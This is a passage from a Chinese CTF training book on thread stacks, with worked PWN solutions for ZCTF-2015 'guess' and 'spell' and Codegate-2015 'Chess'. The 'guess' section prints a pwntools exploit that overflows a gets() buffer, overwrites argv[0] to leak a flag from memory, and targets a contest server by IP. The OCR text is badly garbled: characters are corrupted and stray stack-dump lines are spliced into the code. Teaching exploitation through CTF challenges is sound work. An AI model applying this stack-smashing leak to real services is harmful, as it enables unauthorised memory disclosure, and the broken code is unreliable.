at level:20000 0x0000000077c4f7f0
at level:21000 0x0000000077c05470
at level:22000 0x0000000077bbb0f0
atlevel:230000x0000000077b70d70
at level:24000 0x0000000077b269f0
at level:25000 0x0000000077adc670
at level:260000x0000000077a922f0
at level:270000x0000000077a47f70
level:27577
---
## Page 425
CTF特训营：技术详解、解题方法与
12.5线程栈
425/1144
0x0000000077a1ade0000000000000000014618592ff7f0000
0x0000000077a1adf000000000000000000200000001000000
0x0000000077a1ae0031313131202d2d205553422031313131
0x0000000077a1ae10 00000000 00000000 00000000 00000000
0x0000000077a1ae20 00000000 00000000 0000000000000000
0x0000000077a1ae30 00000000 00000000 00000000 00000000
0x0000000077a1ae40 00000000 00000000 00000000 00000000
0x0000000077a1ae50 00000000 00000000 00000000 00000000
0x0000000077a1ae6000000000000000000000000000000000
0x0000000077a1ae70 00000000 00000000 00000000 00000000
0x0000000077a1ae8000000000000000000000000000000000
0x0000000077a1ae9000000000000000000000000000000000
0x0000000077a1aea0 00000000 00000000 00000000 00000000
0x0000000077a1aeb0 00000000 00000000 00000000 00000000
0x0000000077a1aec0 00000000 00000000 0000000000000000
0x0000000077a1aed000000000000000000000000000000000
over
main join 0
main join 1
Thisisthemainprocess.Over
往届比赛中关于线程栈的CTF赛题具体如下：
{Hack.lu-2014}Marrio（PWN)
{xctf-finnal-2015}http（PWN)
---
## Page 426
CTF特训营：技术详解、解题方法与
12.6.1 (ZCTF-2015)guess(PWN100)
426/1144
12.6真题解析
12.6.1{ZCTF-2015}guess(PWN100)
该题的解题逻辑比较简单，gets的缓冲区是栈上的，可用任意长
度读入，而栈的缓冲区长度是40，如图12-33所示。
char s[40];//[sp+20h] [bp-40h]@3
int64u8;//[sp+48h][bp-18h]@1
U8=*MK_FP（FS
，40LL）；
stream =fopen("flag，"r"）;
if（ stream）
setubuf（stdin,0LL，2，0LL）;
Setubuf（stdout，0LL，2，θLL）;
Setubuf（stderr，0LL，2，0LL);
alarm(θx3Cu);
fseek(stream,0LL,2);
u5= ftell(stream);
fseek(stream,0LL，0);
fgets(::s,v5+1,stream）;
fclose(stream);
puts("please guess the flag:");
gets(s);
if（u5=（unsigned int)strlen(s）)
---
## Page 427
CTF特训营：技术详解、解题方法与.
12.6.1(ZCTF-2015)guess(PWN100)
427/1144
图12-33guess程序反编译代码
由于直接与flag进行比较，所以这里flag是存于内存中的。由于
做了限制，因此必须以“ZCTF”并头，而且长度一定，所以这里首
先需要根据返回的结果判断长度是否正确。
长度开始为32，后来改为33。
由于栈的前面存在主函数main（intargc，char**argv）的参数值
而这个参数argv[O]就是程序的名字，出现异常时会显示在错误信息的
后面，所以只要用特定地址覆盖栈中argv回]的地址就可以达到住意地
址泄露的目的，从而达到泄露原flag信息的目的。
由于"s”（flag存放的地址）最后会与输入值做异或操作，所
以最后只要反异或操作一下就可以了。开始时“ZCTF”这个地方异
或后肯定为0，所以打印的时候，地址应该往后靠一点，如+5。另外
选取的异或数也可能与flag中的相同，存在0截断，所以可以多打印
些地址，这里直接选用“b”。我们发现其能够全部泄露出来（第五
个5以后的信息）。
代码如下：
---
## Page 428
CTF特训营：技术详解、解题方法与
12.6.1 (ZCTF-2015)guess(PWN100)
428/1144
#from zio import *
frompwnimport*
#target="/guess"
target=("115.28.27.103",22222)
def get_io(target):
#r_m=COLORED（RAW,“green")
#w_m=COLORED（RAW,“blue”)
#io=zio（target,timeout =9999,print_read=r_m,print_write = w_m)
#io=process(target,timeout =9999)
io = remote("115.28.27.103", 22222, timeout = 9999)
return io
def leak_len(io,length):
io.readuntil("please guess the flag:In")
flag_addr=0x6010C0
payload=’a'*length+“x00"
#io.gdb hint()
io.writeline(payload)
result=io.readuntil("n")
printresult
#io.close(0)
if "len error” in result:
return False
return True
def pwn(io):
#io.read_until("please guess the flag:In")
io.readuntil("please guess the flag:\n")
[stack]:0x7ffff422210-->0x73736575672f2e（b'/guess)
[stack]:0x7ffff421278-->0x7fff422210->0x73736575672f2e(b/guess)
[stack]:0x7ff422ff0-->0x73736575672f2e（b'/guess)
I[stack]:0x7ff4215e0-->0x7fff422ff0-->0x73736575672f2e（b/guess)
[stack]:0x7fffc0eb7bfa-->0x73736575672f6e（b'n/guess)
[stack]:0x7ffc0eb7f0-->0x73736575672f2e（b'/guess)
Il[stack]:0x7fffc0eb6c48-->0x7fffc0eb7ff0-->0x73736575672f2e（b'/guess)
arg[0]: 0x7fc0eb67c0(a'.)
flag_addr=0x6010C0+5 #+3+6
length=34
payload="ZCTF{"
payload = payload.ljust(length,b)
payload+="x00"
payload=payload.just(0x7fff421278-0x7fff421150,a)
#payload=payload.ljust(0x100,'a)
---
## Page 429
CTF特训营：技术详解、解题方法与
12.6.1 (ZCTF-2015)guess(PWN100)
429/1144
payload+=p64（flag_addr)
raw_input()
#io.gdb_hint()
#io.writeline(payload)
#payload=’a'*0x50
io.writeline(payload)
#io.interact()
io.interactive()
#leak length=9
for i in range(32,256):
print i
io=get io（target)
if leak_len(io,i)== True:
break
exit(O)
io=get_io（target)
pwn(io)
然后进行异或操作即可，代码如下：
a=0lx07\x03SSS;=lx0cQQ&=x16R=[x17x07x111=lx04lx0e"x05]x1fh
result=
foriin a:
result.append(chr(ord(i)ord(b))
print ".join(result)
---
## Page 430
CTF特训营：技术详解、解题方法与
12.6.2{ZCTF-2015)spell(PWN300)
430/1144
12.6.2{ZCTF-2015}spell(PWN300)
这道题的逻辑还是比较简单的，读取用户数据，然后与从驱动中
读到的数据进行对比，若符合要求，则打印flag。
查看驱动代码，可以发现有两个ioct指令，具体如下。
0x80086B01：返回8字节随机数。
0x80086B02：返回时间字符串
spel程序编译代码如图12-34所示。
if（（_DW0RD）a3==0x80086B01）
get_random_bytes(&u14,8LL);
if（copy_to_user（u8，&u14，8LL））
return oLL;
else
result = 0xFFFFFFE7LL;
if（（_DW0RD）a3=θx80086B02）
return result;
do_gettineofday(&u13);
u11 =0x08888888888888889lL *(unsigned
int64)u13>>（
u12 =(signed int64)(((unsigned int128)(@x0888888888
tine_to_tn（u13,0LL,&u14）;
sprintf(
（char*）&u15,
%021d:2021d:“
u12-24*（（（signed
int64)((unsigned
u11+4￥u12-（u12>
---
## Page 435
CTF特训营：技术详解、解题方法与
12.6.3 (Codegate-2015)Chess(PWN700)
435/1144
图12-39chess程序运行情况
当检测到棋盘上没有k或者K时，判定游戏结束
该游戏可以这么对应：
p(P)->兵、r(R)->车、n(N)->马、、K(K)->将，依次类推
字母的行动也与象棋中的角色一样，但是这里不存在阻挡路线的
情况。
输入两点控制行动（from_pos、to_pos），从源点到自的点，游
戏双方交替进行。
下面介绍本题用到的检测机制。
1）检测from_pos、to_pos的函数，如图12-40所示